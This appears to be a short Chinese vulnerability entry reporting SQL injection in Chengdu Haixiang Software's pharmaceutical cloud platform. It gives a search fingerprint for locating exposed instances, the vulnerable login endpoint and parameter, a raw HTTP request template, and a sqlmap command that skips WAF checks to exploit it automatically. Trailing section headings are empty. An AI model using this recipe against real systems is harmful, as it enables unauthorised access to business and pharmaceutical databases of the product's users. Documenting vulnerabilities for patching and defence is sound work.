# 成都海翔软件有限公司海翔药业云平台存在sql注入

- **系统**：成都海翔软件有限公司海翔药业云平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="登录海翔"`
- **请求**：`POST /getylist_login.do HTTP/1.1`

**请求体 / payload**
```
漏洞位置，搜索账套处\
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 13
Cookie: JSESSIONID=CC105C5EED7D5DE8BFCB92D7F4BB74DC; __session:0.5376174871119012:=http:
accountname=1
sqlmap
sqlmap -r 1.txt  --skip-waf --batch
```

**其他**
- 成都海翔软件有限公司海翔药业云平台存在 sql 注入: * 一、漏洞简介
* 二 、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 海翔药业云平台